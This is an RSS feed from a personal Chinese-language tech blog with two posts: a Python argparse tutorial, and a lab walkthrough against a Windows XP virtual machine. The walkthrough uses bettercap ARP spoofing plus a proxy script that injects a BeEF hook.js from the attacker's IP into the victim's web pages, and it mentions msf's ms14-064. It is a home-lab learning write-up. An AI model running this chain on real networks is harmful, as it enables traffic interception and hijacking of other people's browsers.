<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Linux - 标签 - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/linux/</link>
        <description>Linux - 标签 - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Sun, 16 May 2021 18:21:05 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/linux/" rel="self" type="application/rss+xml" /><item>
    <title>Python 学习笔记——ArgParse</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/</link>
    <pubDate>Sun, 16 May 2021 18:21:05 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-05-16-18-25-46%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be.png" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>为了使 <a href="https://github.com/WeepingDogel/TitleGetter" target="_blank" rel="noopener noreffer">TitleGetter</a> 更加灵活，我打算将 <code>list.txt</code> 和输出文件由用户自定， 因此这需要用到命令行选项&hellip; 就像一些我们常用到的软件一样，比如 <code>pacman</code></p>
<p></p>
<p>因此谷歌了一下，了解到了 <a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">ArgParse</a> 这个东西</p>
<blockquote>
<p>The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments.</p>
<p>From: <a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></p>
</blockquote>
<p>然后我就试着敲了一个文件..</p>
<p>运行出来的结果是这样的</p>
<p></p>
<p>那么接下来稍微整理一下相关的笔记吧&hellip;..</p>
<h1 id="创建-parser--添加选项">创建 Parser &amp;&amp; 添加选项</h1>
<p>在一切开始之前，我们需要使用 <code>argparse</code> 库里面的 <code>ArgumentParser</code> 用法来创建一个变量，命名为 &lsquo;parser&rsquo;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里有个参数 <code>description=''</code>， 这里是写一些说明用的&hellip;</p>
<p>比如我们写上</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>顺便我们需要写上一些需要的选项～</p>
<p><code>parser.add_argument()</code> 使用这个就可以了</p>
<p>里面需要加上一些东西, 比如 <code>-a</code>、 <code>--about</code> 这些选项的使用形式</p>
<p>最后加上 <code>args = parser.parse_args()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Show the about&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这时我们已经可以加上 <code>-h</code> 来看看效果了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ python a.py -h
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">usage: a.py [-h] [-a ABOUT]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">optional arguments:
</span></span><span class="line"><span class="cl">  -h, --help            show this help message and exit
</span></span><span class="line"><span class="cl">  -a ABOUT, --about ABOUT
</span></span><span class="line"><span class="cl">                        Show the about
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么这里整理一下常用的这么几个参数</p>
<ol>
<li><code>default</code>
<ul>
<li>没有设置任何参数情况下的默认参数</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Show the about&#39;</span><span class="p">,</span> <span class="n">defualt</span><span class="o">=</span><span class="s1">&#39;text.txt&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>如果用户没有设置这个参数则会自动提供一个默认的</li>
</ul>
</li>
<li><code>help</code>
<ul>
<li>给对应的选项添加说明文字</li>
</ul>
</li>
<li>required
<ul>
<li>用于决定这个参数是否一定需要设置</li>
<li>如果设置了 <code>required=True</code>, 在运行时如果不设置这个参数就会报错</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ python a.py   
</span></span><span class="line"><span class="cl">usage: a.py [-h] -a ABOUT
</span></span><span class="line"><span class="cl">a.py: error: the following arguments are required: -a/--about
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<h1 id="调用获取到的选项参数">调用获取到的选项参数</h1>
<p>接下来我们要做的是，将获取到的参数运用起来。</p>
<p>我们知道，当在命令行中给选项后面写上了一些东西，那么程序会默认地作为字符串而获取它，这时我们就要拿这获得的东西做我们想要做的事</p>
<p>我简单地写了个能够将一个文件的内容写到另一个文件的脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;                                                            
</span></span></span><span class="line"><span class="cl"><span class="s1">By WeepingDogel
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">GetParser</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Help&#39;</span><span class="p">,</span> <span class="n">epilog</span><span class="o">=</span><span class="s1">&#39;A new testing program.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span><span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file&#39;</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;test.txt&#39;</span> <span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span><span class="s1">&#39;--read&#39;</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s1">&#39;read a file&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parser</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Write</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s1">&#39; has been written&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Read</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">GetParser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">Write</span><span class="p">(</span><span class="n">Read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">read</span><span class="p">),</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>好的不难看出，我们得到的东西会到这个 <code>args</code> 变量里面去，<strong>因为它是由 <code>parser.parse_args()</code> 这个函数所返回的内容所赋值而来的，而取出对应选项参数得到的内容则是 <code>args.选项名</code></strong></p>
<p>比如我们要获取写出的文件名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ vim b.py
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Help&#39;</span><span class="p">,</span> <span class="n">epilog</span><span class="o">=</span><span class="s1">&#39;A new testing program.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span><span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file&#39;</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;test.txt&#39;</span> <span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">output</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The filename is &#34;</span><span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ python b.py -o WeepingDogel
</span></span><span class="line"><span class="cl">The filename is WeepingDogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见我们已经获取到这个字符串 &ldquo;WeepingDogel&rdquo; 了。</p>
<p>同理，需要读取的文件名也是一样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">args</span><span class="o">.</span><span class="n">read</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这么写就可以了～</p>
<p>接下来用截图来看看上面那一堆代码的效果：
</p>
<p>简单的创建与使用就是如此&hellip;</p>
<p>当然还有更多的用法需要探索..</p>
<h1 id="结语">结语</h1>
<p>那么我接下来要做的就是将这些更新进 <a href="https://github.com/WeepingDogel/TitleGetter" target="_blank" rel="noopener noreffer">TitleGetter</a> 啦！</p>
<p>以后就不需要在配置文件里设置 <code>list.txt</code> 的位置了！ 输出的文件位置也不需要固定了！！</p>
<hr>
<h1 id="参考链接">参考链接</h1>
<ul>
<li><a href="https://vra.github.io/2017/12/02/argparse-usage/" target="_blank" rel="noopener noreffer">argparse简要用法总结 | Yunfeng&rsquo;s Simple Blog</a></li>
<li><a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></li>
</ul>
]]></description>
</item><item>
    <title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</title>
    <link>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
    <pubDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-02-02_13-51.png" referrerpolicy="no-referrer">
            </div><h2 id="序">序</h2>
<p>嗯&hellip; 惯例是要先说点废话嘛..</p>
<p>今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～</p>
<p>然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～</p>
<p>不多说啦，我们开始～</p>
<h3 id="测试环境">测试环境</h3>
<p>啊咧，先说说测试环境。</p>
<ul>
<li>
<p>攻击机</p>
<ul>
<li>Arch Linux</li>
<li>192.168.101.15</li>
</ul>
</li>
<li>
<p>靶机</p>
<ul>
<li>Windows XP on VirtualBox</li>
<li>192.168.101.43</li>
</ul>
</li>
</ul>
<p>条件有限，就只能用 XP 啦～</p>
<h3 id="用到的工具">用到的工具</h3>
<ol>
<li>bettercap
<ul>
<li>首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&hellip;</li>
</ul>
</li>
<li>beef
<ul>
<li>用来劫持浏览器&hellip; 然后可以干很多事情，具体的也不是很了解呢。</li>
</ul>
</li>
<li>msf
<ul>
<li>这个就是老朋友啦～</li>
</ul>
</li>
</ol>
<p>什么? nmap? 这次用不着哦～</p>
<h2 id="测试过程">测试过程</h2>
<p>首先是打开 <code>bettercap</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们会看到这样的返回结果..</p>
<p></p>
<p><strong>注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。</strong></p>
<p></p>
<p>然后设置 arp 欺骗的目标：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>这里设置的 targets 是靶机的地址哦</strong></p>
<p>接下来启动 beef ，和上面说的一样要加 <code>sudo</code> 。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到返回：</p>
<p></p>
<p>那么来说说终端里显示的这几个链接</p>
<ul>
<li>Hook URL: <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
<ul>
<li>这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～</li>
<li>一会儿我们要把它写进一个攻击脚本里～</li>
</ul>
</li>
<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/ui/panel</a>
<ul>
<li>这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
</li>
</ul>
</li>
</ul>
<p>关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录<code>（beef:beef）</code>，甚至不能启动，比如我的 Arch 就会这样。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个时候你需要做的是修改 <code>config.yaml</code> 这个文件中的用户名和密码，我的位置在 <code>/usr/share/beef/config.yaml</code></p>
<p>改成这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;随便起个名字&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;随便想个密码&#34;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。</p>
<p>好了，话不多说，我们继续。</p>
<p>接下来我们要做的是写一个 js 脚本，给 bettercap 用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将这个文件保存到你知道的目录，我将它保存到 <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code></p>
<p>然后我们回到 bettercap，设置 <code>http.proxy.script</code> 这个参数为上面这个路径：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后依次启动 <code>net.probe</code>、<code>arp.spoof</code>、<code>http.proxy</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
</span></span></code></pre></td></tr></table>
</div>
</div><p>嗯&hellip; 接下来就启动好了&hellip;</p>
<p></p>
